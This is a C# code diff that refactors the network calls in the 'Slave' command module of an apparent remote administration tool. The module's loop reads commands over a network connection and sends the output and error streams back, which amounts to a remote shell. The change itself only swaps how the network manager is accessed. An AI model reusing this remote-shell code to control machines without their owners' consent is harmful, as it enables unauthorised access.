@@ -1,10 +1,10 @@
 ﻿using Shared;
-using Slave.Commands.Core;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
+using Slave.Core;
 
 namespace Slave.Commands
 {
@@ -39,7 +39,7 @@ namespace Slave.Commands
 
             while (true)
             {
-                var userInput = SlaveCommandsManager.networkManager.ReadLine();
+                var userInput = SlaveNetworkManager.GetInstance().ReadLine();
 
                 if (userInput == "exit")
                 {
@@ -83,7 +83,7 @@ namespace Slave.Commands
                     Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
                 }
 
-                SlaveCommandsManager.networkManager.WriteLine(output);
+                SlaveNetworkManager.GetInstance().WriteLine(output);
             }
             catch (Exception)
             {
@@ -98,7 +98,7 @@ namespace Slave.Commands
         /// <param name="e"></param>
         void CmdErrorDataHandler(object sender, DataReceivedEventArgs e)
         {
-            SlaveCommandsManager.networkManager.WriteLine(e.Data);
+            SlaveNetworkManager.GetInstance().WriteLine(e.Data);
         }
     }
 }
